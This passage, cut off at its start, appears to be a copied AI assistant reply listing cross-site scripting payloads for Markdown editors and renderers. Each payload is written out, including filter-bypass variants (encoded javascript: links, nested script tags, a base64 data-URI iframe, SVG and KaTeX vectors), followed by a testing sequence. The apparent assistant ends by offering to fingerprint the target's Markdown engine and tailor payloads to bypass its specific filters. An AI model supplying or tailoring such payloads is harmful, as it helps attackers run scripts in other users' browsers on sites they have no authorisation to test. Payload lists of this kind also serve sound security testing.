sic XSS via HTML Injection (Raw HTML allowed)
markdown
Copy
Edit
<script>alert(1)</script>
Works if raw HTML is allowed and script is not filtered.

🖼️ XSS via img with onerror
markdown
Copy
Edit
<img src=x onerror=alert(1)>
Or:

markdown
Copy
Edit
![x](x "onerror=alert(1)")
Useful when images are rendered but tags are stripped.

📄 SVG Onload Trigger
markdown
Copy
Edit
<svg onload=alert(1)>
Or:

markdown
Copy
Edit
<svg><script>alert(1)</script></svg>
SVG parsing quirks bypass filters in some cases.

🔗 Autolink Triggered via javascript: URI
markdown
Copy
Edit
[clickme](javascript:alert(1))
Or encoded:

markdown
Copy
Edit
[clickme](javas&#99;ript:alert(1))
Targets Markdown parsers that don't sanitize protocol handlers.

🧫 Malformed Attribute Injection
markdown
Copy
Edit
<a href="x" onclick=alert(1)>click</a>
Or if quotes are stripped:

markdown
Copy
Edit
<a href=x onclick=alert(1)>click</a>
🧬 Combined Markdown + HTML
markdown
Copy
Edit
**bold**<script>alert(1)</script>
Some renderers apply Markdown formatting first, then parse HTML.

🔁 Obfuscated
markdown
Copy
Edit
<scr<script>ipt>alert(1)</script>
Or base64-encoded iframe loader:

markdown
Copy
Edit
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
💉 Exotic Injection: MathJax/KaTeX
If the editor supports LaTeX or math environments:

markdown
Copy
Edit
$$\text{\href{javascript:alert(1)}{click}}$$
🔍 Testing Strategy
Start with:

markdown
Copy
Edit
<script>alert('xss')</script>
If it doesn't fire:

Try <img onerror=alert(1) src=x>

Try [x](javascript:alert(1))

If everything is sanitized, we can look at:

CSS injection

DOM clobbering

Stored event handlers

Would you like me to fingerprint the Markdown engine from a sample response? I can then tailor the payloads for bypassing its specific filter behavior.





